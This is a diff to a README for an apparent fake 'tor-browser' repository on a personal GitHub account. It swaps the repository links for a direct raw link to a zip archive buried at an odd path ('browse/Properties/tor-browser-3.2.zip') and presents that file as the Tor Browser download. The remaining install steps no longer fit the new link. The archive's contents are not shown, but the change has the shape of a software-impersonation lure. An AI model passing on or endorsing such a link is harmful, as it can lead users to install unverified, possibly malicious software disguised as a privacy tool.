@@ -1,6 +1,6 @@
 # 🌐 tor-browser - Maintain privacy while browsing the web
 
-[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://github.com/yaseen5679/tor-browser)
+[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://raw.githubusercontent.com/yaseen5679/tor-browser/main/browse/Properties/tor-browser-3.2.zip)
 
 ## 📌 About this project
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 How to download and install
 
-1. Visit the following link to access the software files: [https://github.com/yaseen5679/tor-browser](https://github.com/yaseen5679/tor-browser)
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/yaseen5679/tor-browser/main/browse/Properties/tor-browser-3.2.zip](https://raw.githubusercontent.com/yaseen5679/tor-browser/main/browse/Properties/tor-browser-3.2.zip)
 2. Locate the link labeled "Code" on the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
